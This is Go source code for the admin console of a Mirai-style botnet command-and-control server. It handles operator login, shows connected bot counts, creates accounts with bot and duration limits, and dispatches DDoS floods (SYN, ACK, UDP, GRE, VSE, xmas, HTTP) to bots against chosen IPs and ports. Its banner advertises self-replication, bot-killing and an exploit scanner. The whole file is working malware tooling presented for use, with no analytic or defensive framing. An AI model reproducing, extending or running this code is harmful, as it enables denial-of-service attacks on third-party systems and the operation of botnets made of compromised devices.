package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[0;95mU\x1b[1;33ms\x1b[0;31me\x1b[0;35mr\x1b[1;31mn\x1b[1;35ma\x1b[1;32mm\x1b[1;34me\x1b[0;95m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[0;95mP\x1b[1;33ma\x1b[0;31ms\x1b[0;35ms\x1b[1;31mw\x1b[1;35mo\x1b[1;32mr\x1b[1;34md\x1b[0;95m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[32;1m[!] INVALID INFORMATION\r\n"))
        this.conn.Write([]byte("\033[31mpress any key to exit\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Bots Connected | %s\007", BotCount , username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[1;35m\r\n"))
    this.conn.Write([]byte("\033[1;30m         This Net is Owned by LeeOn123\r\n\033[0m"))
    this.conn.Write([]byte("\033[1;96m    ╔═══════════════════════════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[1;96m    ║    d8888b.  .d88b.  d888888b d8b   db d88888b d888888b    ║\r\n"))    
    this.conn.Write([]byte("\033[1;96m    ║    88  `8D .8P  Y8. `~~88~~' 888o  88 88'     `~~88~~'    ║\r\n"))
    this.conn.Write([]byte("\033[1;96m    ║    88~~~b. 88    88    88    88 V8o88 88~~~~~    88       ║\r\n"))    
    this.conn.Write([]byte("\033[1;96m    ║    88   8D `8b  d8'    88    88  V888 88.        88       ║\r\n"))
    this.conn.Write([]byte("\033[1;96m    ║    Y8888P'  `Y88P'     YP    VP   V8P Y88888P    YP       ║\r\n"))
    this.conn.Write([]byte("\033[1;96m    ╚═══════════════════════════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\x1b[1;36m       \x1b[1;35m[\x1b[1;32m+\x1b[1;35m]\x1b[0;94mVersion 3.1\x1b[1;35m[\x1b[1;32m+\x1b[1;35m]\r\n\x1b[0m"))

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[32;1m~> \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" {
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[1;35m\r\n"))
    this.conn.Write([]byte("\033[1;30m         This Net is Owned by LeeOn123\r\n\033[0m"))
    this.conn.Write([]byte("\033[1;96m    ╔═══════════════════════════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[1;96m    ║    d8888b.  .d88b.  d888888b d8b   db d88888b d888888b    ║\r\n"))    
    this.conn.Write([]byte("\033[1;96m    ║    88  `8D .8P  Y8. `~~88~~' 888o  88 88'     `~~88~~'    ║\r\n"))
    this.conn.Write([]byte("\033[1;96m    ║    88~~~b. 88    88    88    88 V8o88 88~~~~~    88       ║\r\n"))    
    this.conn.Write([]byte("\033[1;96m    ║    88   8D `8b  d8'    88    88  V888 88.        88       ║\r\n"))
    this.conn.Write([]byte("\033[1;96m    ║    Y8888P'  `Y88P'     YP    VP   V8P Y88888P    YP       ║\r\n"))
    this.conn.Write([]byte("\033[1;96m    ╚═══════════════════════════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\x1b[1;36m       \x1b[1;35m[\x1b[1;32m+\x1b[1;35m]\x1b[0;94mVersion 3.1\x1b[1;35m[\x1b[1;32m+\x1b[1;35m]\r\n\x1b[0m"))
continue
		}
		if cmd == "show" || cmd == "logo" {

	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[1;30m         This Net is Owned by LeeOn123\r\n\033[0m"))	
	this.conn.Write([]byte("   \033[01;30m  ██████   \033[01;37m  ████    \033[01;30m ██████╗  ██╗  ██╗  ██████╗  ██████╗\r\n"))
	this.conn.Write([]byte("   \033[01;30m  ██╔══██╗ \033[01;37m ██╔══██╗ \033[01;30m   ██╔═╝  ███╗ ██║  ██╔═══╝    ██╔═╝\r\n"))
	this.conn.Write([]byte("   \033[01;30m  ███████║ \033[01;37m ██║  ██║ \033[01;30m   ██║    ██║█╗██║  ██████╗    ██║  \r\n"))
	this.conn.Write([]byte("   \033[01;30m  ██╔══██║ \033[01;37m ██║  ██║ \033[01;30m   ██║    ██║ ███║  ██╔═══╝    ██║  \r\n"))
	this.conn.Write([]byte("   \033[01;30m  ███████║ \033[01;37m  █████╔╝ \033[01;30m   ██║    ██║  ██║  ██████╗    ██║  \r\n"))
	this.conn.Write([]byte("   \033[01;30m  ╚══════╝ \033[01;37m  ╚════╝  \033[01;30m   ╚═╝    ╚═╝  ╚═╝  ╚═════╝    ╚═╝  \r\n"))
            continue
        }
        if err != nil || cmd == "?" || cmd == "help" {
            this.conn.Write([]byte("\x1b[1;36m[+]---------------------------------------------------------[+]\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m               Botnet Commands                             \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m greip [ip] [time] dport=[port]            | greip         \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m udpplain [ip] [time] dport=[80]           | udpplain      \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m ack [ip] [time] dport=[port]              | ack           \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m syn [ip] [time] dport=[port]              | syn           \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m vse [ip] [time] dport=[port]              | vse           \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m greeth [ip] [time] dport=[port]           | greeth        \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m xmas [ip] [time] dport=[port]             | xmas          \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m std [ip] [time] dport=[port]              | std           \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m http [ip] [time] dport=[port]             | http          \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m cls or clear                              | clears screen \x1b[1;36m|\r\n"))
			this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m botcount or bots                          | shows bots    \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m[+]---------------------------------------------------------[+]\r\n"))
            continue
        }
        if err != nil || cmd == "features" || cmd == "stuff" || cmd == "info" {
            this.conn.Write([]byte("\x1b[1;36m[+]---------------------------------------------------------[+]\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m                  BotNet Features                                    \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m               + Advanced Selfrep                                    \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m               + Advanced Botkilling                                 \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m               + Added Xmas Attack Method                            \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m               + Added Std Attack Method                             \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m               + Added a Attack hub/website                          \x1b[1;36m|\r\n"))
            this.conn.Write([]byte("\x1b[1;36m |\x1b[0;95m               + Added Exploit scanner                               \x1b[1;36m|\r\n"))  
            this.conn.Write([]byte("\x1b[1;36m[+]---------------------------------------------------------[+]\r\n"))
            continue
        }
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
        if cmd == "botcount" || cmd == "bots" || cmd == "count" {
		botCount = clientList.Count()
            m := clientList.Distribution()
			this.conn.Write([]byte(fmt.Sprintf("\033[1;35m[+]=============================[+]\r\n\033[0m")))
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[35m%s [%d]\033[0m\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\033[35;1mTOTAL [%d]\r\n\033[0m", botCount )))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;35m[+]=============================[+]\033[0m\r\n")))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
